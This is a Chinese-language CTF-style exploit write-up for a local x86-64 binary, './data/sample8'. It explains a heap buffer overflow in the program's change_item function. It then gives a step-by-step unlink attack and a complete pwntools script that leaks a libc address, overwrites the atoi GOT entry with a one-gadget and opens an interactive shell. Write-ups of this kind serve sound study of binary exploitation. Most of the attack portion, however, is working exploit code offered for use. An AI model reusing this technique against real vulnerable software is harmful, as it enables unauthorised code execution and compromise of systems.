# 漏洞利用文档

## 执行环境

基于调试记录和程序分析，程序的执行环境如下：

- **二进制文件**：`./data/sample8`（64位ELF可执行文件）
- **架构**：x86-64
- **内存保护机制**：
  - **No PIE**：代码段基地址固定（0x400000），便于地址计算
  - **Partial RELRO**：GOT表可写，允许覆盖GOT条目
  - **NX Enabled**：堆栈不可执行，需通过ROP或跳转libc执行代码
  - **Stack Canary**：栈保护开启，但漏洞在堆上，不影响利用
- **依赖库**：使用glibc（具体版本从调试中泄露的atoi地址计算得出）
- **运行方式**：本地进程（exp中使用`process()`）
- **关键地址**：
  - 代码段：0x400000
  - GOT表：0x602000-0x603000
  - 全局数组：`itemlist`在0x6020c0，`unk_6020C8`在0x6020c8
  - 初始堆块：0x25c21000（存储函数指针）

环境配置要求：需要安装pwntools和对应libc，程序路径为`./data/sample8`。

## 漏洞成因

### 关键结构体
程序使用两个全局数组管理物品：
- **`itemlist`**（地址0x6020c0）：存储物品名称长度（每个元素4字节）
- **`unk_6020C8`**（地址0x6020c8）：存储物品名称指针（每个元素8字节）
- 每个物品占用两个数组的相同索引，最多100个物品
- 结构示例（索引0）：
  - `itemlist[0]`：长度（如0x80）
  - `unk_6020C8[0]`：指向堆块用户数据的指针（如0x25c21030）

### 漏洞分析
漏洞位于`change_item()`函数（反编译代码）：
```c
printf("Please enter the length of item name:");
read(0, nptr, 8u);
v2 = atoi(nptr);  // 用户控制的新长度
printf("Please enter the new name of the item:");
*(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
```
**漏洞原因**：
1. 用户输入的新长度`v2`没有验证是否超过原始`malloc`分配的大小
2. 直接使用`v2`作为`read`的第三个参数（读取字节数）
3. 导致堆缓冲区溢出，可覆盖相邻堆块的元数据和用户数据

**漏洞类型**：堆缓冲区溢出（Heap Buffer Overflow）
**利用后果**：覆盖堆元数据可实现unlink攻击，修改全局指针，最终劫持控制流。

## 漏洞利用过程

exp脚本通过9个步骤完成利用，关键内存变化如下表：

| 步骤 | 操作 | 内存变化关键点 | 目的 |
|------|------|----------------|------|
| 1 | `malloc(0x80,b'aaaa'); malloc(0x80,b'bbbb')` | 分配堆块0（0x25c21020）和堆块1（0x25c210b0），初始化堆布局 | 创建两个相邻堆块，为溢出提供目标 |
| 2 | `change(0,0x90,py1)` | 溢出堆块0，覆盖堆块1元数据：`prev_size=0x80`, `size=0x90`（清除PREV_INUSE） | 伪造堆块1为free状态，准备unlink攻击 |
| 3 | `free(1)` | 触发unlink，修改`unk_6020C8[0]`从0x25c21030变为0x6020b0（stdin GOT） | 建立任意写原语，全局指针指向GOT区域 |
| 4 | `change(0,len(py2),py2)` | 通过任意写修改`unk_6020C8[0]`指向atoi GOT（0x602068） | 重定向指针到关键GOT条目（atoi） |
| 5 | `puts()` | 触发输出，泄露atoi的libc地址（0x7f459772be90） | 计算libc基地址，为one-gadget做准备 |
| 6 | 计算one-gadget | `onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4` | 基于泄露地址计算one-gadget偏移 |
| 7 | `change(0,0x10,p64(onegadget))` | 覆盖atoi GOT（0x602068）为one-gadget地址（0x7f45977e53a4） | 劫持控制流，下次调用atoi时执行shellcode |
| 8 | `exit()` | 触发atoi调用，执行one-gadget，启动`/bin/dash` | 获取shell，完成权限提升 |
| 9 | `p.interactive()` | 进入交互式shell，可执行任意命令 | 维持访问，进行后续操作 |

**堆布局演变**：
- **初始**：堆块0（使用中） → 堆块1（使用中） → Top Chunk
- **步骤2后**：堆块0（溢出伪造） → 堆块1（元数据破坏） → Top Chunk
- **步骤3后**：堆块0合并到Top Chunk，全局指针被修改
- **最终**：程序被替换为`/bin/dash`，堆内存重新映射

**关键数据变化**：
- `unk_6020C8[0]`：0x25c21030 → 0x6020b0 → 0x602068
- `itemlist[0]`：0x80 → 0x6161616161616161（被覆盖）
- atoi GOT：libc地址 → one-gadget地址

## Exploit

```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/sample8')
p = process('./data/sample8')
libc = elf.libc  # 使用二进制自带的libc，或指定路径

# 工具函数定义
sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))

def exit():
    ru("Your choice:")
    sl('5')

def puts():
    ru("Your choice:")
    sl('1')

def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

# Step 1: 初始化堆布局，分配两个相邻堆块
malloc(0x80,b'aaaa');malloc(0x80,b'bbbb')  # 堆块0存储"aaaa"，堆块1存储"bbbb"

# Step 2: 触发堆溢出，伪造堆块1的元数据
FD = 0x6020c8 - 3*8  # 计算伪造的fd指针，指向全局数组附近（用于unlink）
BK = FD + 8          # 伪造的bk指针
# 构造payload：伪造堆块元数据 + 填充 + 覆盖堆块1的prev_size和size
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90)
change(0,0x90,py1)  # 指定长度0x90（大于原始0x80），触发溢出

# Step 3: 释放堆块1，触发unlink攻击
free(1)  # 由于堆块1元数据被伪造，free操作触发unlink，修改全局指针

# Step 4: 利用任意写原语，重定向指针到atoi GOT
atoi_got = elf.got["atoi"]  # 获取atoi的GOT地址（0x602068）
py2 = b'a'*24 + p64(atoi_got)  # 填充24字节后写入atoi GOT地址
change(0,len(py2),py2)  # 修改全局指针，现在unk_6020C8[0]指向atoi GOT

# Step 5: 触发puts输出，泄露atoi的libc地址
puts()  # 调用puts函数，输出内容中包含atoi地址

# Step 6: 解析泄露地址并计算one-gadget
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8,b'\x00'))  # 从输出中解析atoi地址
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4  # 计算one-gadget地址（基于特定libc版本）

# Step 7: 覆盖atoi GOT为one-gadget地址
change(0,0x10,p64(onegadget))  # 通过任意写覆盖atoi GOT条目

# Step 8: 触发exit，调用atoi（实际执行one-gadget）
exit()  # 程序调用exit菜单，触发atoi，执行one-gadget获取shell

# Step 9: 进入交互模式，操作shell
p.interactive()  # 用户现在可以执行任意shell命令
```

**关键注释说明**：
- **unlink攻击**：步骤2-3通过伪造堆块元数据，利用glibc的unlink机制修改全局指针。
- **任意写原语**：步骤4后，通过`change(0,...)`可写入任意地址（当前指向GOT）。
- **one-gadget计算**：步骤6需要根据实际libc版本调整偏移（0xf03a4为示例）。
- **控制流劫持**：步骤7覆盖GOT后，任何调用atoi的地方都会跳转到one-gadget。

**利用成功标志**：步骤9进入交互式shell，可执行如`whoami`、`cat flag`等命令。
